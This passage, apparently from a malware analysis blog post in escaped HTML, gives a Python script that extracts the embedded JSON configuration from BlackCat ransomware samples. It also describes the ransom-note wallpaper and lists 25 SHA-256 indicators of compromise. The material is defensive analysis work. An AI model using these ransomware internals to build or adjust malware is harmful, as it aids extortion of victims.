&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;typing&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Union&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BlackCatConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__str__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc_md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;calc_sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hasher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_file_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Union&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'BlackCat Ransomware conf extractor'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-j'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'--json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'store_true'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dump extracted config to a json file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'path to sample'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file size (bytes): &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_file_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MD5: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calc_md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SHA-256: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calc_sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scan_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;7B22636F6E6669675F696422&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# = {&quot;config_id&quot;
&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;unable to find config offset :(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;blackCat_config-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;calc_md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.json&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;jsonOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;wrote &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; bytes to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BlackCatConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;an error occurred: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After BlackCat has finished encrypting all files on the system, the desktop wallpaper is altered to direct the user to the ransom note.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-55.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ioc&quot;&gt;IOC&lt;/h3&gt;

&lt;p&gt;Another samples (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA-256&lt;/code&gt;):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;0c6f444c6940a3688ffc6f8b9d5774c032e3551ebbccb64e4280ae7fc1fac479&lt;/li&gt;
  &lt;li&gt;13828b390d5f58b002e808c2c4f02fdd920e236cc8015480fa33b6c1a9300e31&lt;/li&gt;
  &lt;li&gt;15b57c1b68cd6ce3c161042e0f3be9f32d78151fe95461eedc59a79fc222c7ed&lt;/li&gt;
  &lt;li&gt;1af1ca666e48afc933e2eda0ae1d6e88ebd23d27c54fd1d882161fd8c70b678e&lt;/li&gt;
  &lt;li&gt;2587001d6599f0ec03534ea823aab0febb75e83f657fadc3a662338cc08646b0&lt;/li&gt;
  &lt;li&gt;28d7e6fe31dc00f82cb032ba29aad6429837ba5efb83c2ce4d31d565896e1169&lt;/li&gt;
  &lt;li&gt;2cf54942e8cf0ef6296deaa7975618dadff0c32535295d3f0d5f577552229ffc&lt;/li&gt;
  &lt;li&gt;38834b796ed025563774167716a477e9217d45e47def20facb027325f2a790d1&lt;/li&gt;
  &lt;li&gt;3d7cf20ca6476e14e0a026f9bdd8ff1f26995cdc5854c3adb41a6135ef11ba83&lt;/li&gt;
  &lt;li&gt;40f57275721bd74cc59c0c59c9f98c8e0d1742b7ae86a46e83e985cc4039c3a5&lt;/li&gt;
  &lt;li&gt;4e18f9293a6a72d5d42dad179b532407f45663098f959ea552ae43dbb9725cbf&lt;/li&gt;
  &lt;li&gt;59868f4b346bd401e067380cac69080709c86e06fae219bfb5bc17605a71ab3f&lt;/li&gt;
  &lt;li&gt;5bdc0fb5cfbd42de726aacc40eddca034b5fa4afcc88ddfb40a3d9ae18672898&lt;/li&gt;
  &lt;li&gt;658e07739ad0137bceb910a351ce3fe4913f6fcc3f63e6ff2eb726e45f29e582&lt;/li&gt;
  &lt;li&gt;731adcf2d7fb61a8335e23dbee2436249e5d5753977ec465754c6b699e9bf161&lt;/li&gt;
  &lt;li&gt;7b2449bb8be1b37a9d580c2592a67a759a3116fe640041d0f36dc93ca3db4487&lt;/li&gt;
  &lt;li&gt;7e363b5f1ba373782261713fa99e8bbc35ddda97e48799c4eb28f17989da8d8e&lt;/li&gt;
  &lt;li&gt;bd337d4e83ab1c2cacb43e4569f977d188f1bb7c7a077026304bf186d49d4117&lt;/li&gt;
  &lt;li&gt;be8c5d07ab6e39db28c40db20a32f47a97b7ec9f26c9003f9101a154a5a98486&lt;/li&gt;
  &lt;li&gt;c3e5d4e62ae4eca2bfca22f8f3c8cbec12757f78107e91e85404611548e06e40&lt;/li&gt;
  &lt;li&gt;c5ad3534e1c939661b71f56144d19ff36e9ea365fdb47e4f8e2d267c39376486&lt;/li&gt;
  &lt;li&gt;c8b3b67ea4d7625f8b37ba59eed5c9406b3ef04b7a19b97e5dd5dab1bd59f283&lt;/li&gt;
  &lt;li&gt;cefea76dfdbb48cfe1a3db2c8df34e898e29bec9b2c13e79ef40655c637833ae&lt;/li&gt;
  &lt;li&gt;f815f5d6c85bcbc1ec071dd39532a20f5ce910989552d980d1d4346f57b75f89&lt;/li&gt;
  &lt;li&gt;f837f1cd60e9941aa60f7be50a8f2aaaac380f560db8ee001408f35c1b7a97cb&lt;/li&gt;
&lt;/ul&gt;

